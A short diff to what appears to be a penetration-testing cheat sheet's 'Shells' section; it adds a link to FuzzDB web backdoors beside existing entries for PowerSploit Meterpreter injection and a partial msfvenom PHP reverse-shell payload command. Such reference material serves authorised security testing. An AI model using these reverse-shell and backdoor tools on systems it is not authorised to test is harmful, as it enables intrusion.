@@ -832,6 +832,8 @@ Shells
 -   Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell 
     https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
     
+-   Web Backdoors from Fuzzdb (
+    https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors
 
 -   msfvenom -p php/meterpreter\_reverse\_tcp LHOST=&lt;Your IP
     Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt;
